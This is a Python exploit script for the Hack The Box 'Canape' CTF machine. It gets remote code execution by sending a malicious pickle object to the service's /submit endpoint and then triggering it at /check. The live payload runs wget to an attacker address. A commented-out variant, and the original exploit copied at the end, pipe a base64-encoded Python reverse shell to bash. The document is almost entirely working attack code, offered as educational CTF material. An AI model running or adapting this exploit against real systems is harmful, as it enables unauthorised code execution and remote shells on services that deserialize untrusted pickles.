#!/usr/bin/env python
#@author memN0ps and zc00l
import cPickle
import os
from requests import post
from hashlib import md5

class Exploit(object):
    def __reduce__(self):
	#<-------------Modify your payload here to get RCE----->
	#Exploit wont work if the following are not added to /etc/hosts
	#10.10.10.70 canape.htb http://canape.htb www.canape.htb
        return (os.system, ('wget 10.10.14.3:8000/',))
	#You can get a reverse shell this way just change IP and port then re-encode with base64
	#return (os.system, ('echo cHl0aG9uIC1jICJpbXBvcnQgb3M7IGltcG9ydCBwdHk7IGltcG9ydCBzb2NrZXQ7IGxob3N0ID0gJzEwLjEwLjE0LjMnOyBscG9ydCA9IDQ0MzsgcyA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSk7IHMuY29ubmVjdCgobGhvc3QsIGxwb3J0KSk7IG9zLmR1cDIocy5maWxlbm8oKSwgMCk7IG9zLmR1cDIocy5maWxlbm8oKSwgMSk7IG9zLmR1cDIocy5maWxlbm8oKSwgMik7IG9zLnB1dGVudignSElTVEZJTEUnLCAnL2Rldi9udWxsJyk7IHB0eS5zcGF3bignL2Jpbi9iYXNoJyk7IHMuY2xvc2UoKTsiIA==|base64 -d|bash',))

def createPayload():
    return cPickle.dumps(Exploit())

def main():
	# The URL and Exploit
	URL = "http://canape.htb/submit"
	CHECK = "http://canape.htb/check"

	# Here we serialize a malicious Pickle object
	char = createPayload() + "homer"
	quote = "hyperootkit"

	# Here we obtain the digest
	id = md5(char + quote).hexdigest()
	print("id: {0}".format(id))

	print("######################STAGE 1#############################\n")
	#Send stage 1 exploit
	stage1(char, quote, URL)

	print("######################STAGE 2#############################\n")
	#Send stage 2 exploit
	stage2(CHECK, id)

def stage1(char, quote, URL):
	#Put the malicious code and quote in a list
	print("Sending payload!..................\n")
	payload = {"character":char,"quote":quote}
	#Send a post request with our malicious payload
	submit = post(URL, data=payload)
	print("######################Checking############################\n")
	#Check to see if the post request was submitted or not.
	isSubmitted(submit)

def stage2(CHECK, id):
	# Send the exploit
	print("Sending payload!..................\n")
	print("Payload sent!..................\n")
	submit = post(CHECK, data={"id":id})
	print(submit.status_code)

def isSubmitted(submit):
    if submit.status_code == 200:
	print("Payload sent!..................\n")
    else:
	print("Submit error.")

if __name__=="__main__":
	main()

"""
This was the offical exploit written by zc00l (BELOW) but I rewrote it THE ABOVE from scratch as you can see to get a better understanding of what it does 
for educational purposes in our CTF challenge. I love python :D thanks zc00l.

#!/usr/bin/env python
# zcool canape exploit
from requests import post
from hashlib import md5
import cPickle
import os

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('echo cHl0aG9uIC1jICJpbXBvcnQgb3M7IGltcG9ydCBwdHk7IGltcG9ydCBzb2NrZXQ7IGxob3N0ID0gJzEwLjEwLjE0LjMnOyBscG9ydCA9IDQ0MzsgcyA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSk7IHMuY29ubmVjdCgobGhvc3QsIGxwb3J0KSk7IG9zLmR1cDIocy5maWxlbm8oKSwgMCk7IG9zLmR1cDIocy5maWxlbm8oKSwgMSk7IG9zLmR1cDIocy5maWxlbm8oKSwgMik7IG9zLnB1dGVudignSElTVEZJTEUnLCAnL2Rldi9udWxsJyk7IHB0eS5zcGF3bignL2Jpbi9iYXNoJyk7IHMuY2xvc2UoKTsiIA==|base64 -d|bash',))

def createPayload():
    return cPickle.dumps(Exploit())

URL = "http://canape.htb/submit"
EXPLOIT = "http://canape.htb/check"

char = createPayload() + "homer"
quote = "zcool"

p_id = md5(char + quote).hexdigest()
print("id: {0}".format(p_id))


print("Submitting ...")
data = {"character":char,"quote":quote}
submit = post(URL, data=data)
if submit.status_code == 200:
    print("Submit ok.")
else:
    print("Submit error.")


data={"id", p_id}

print("Sending final request ...")
p = post(EXPLOIT, data={"id":p_id})

print(p.status_code)


"""
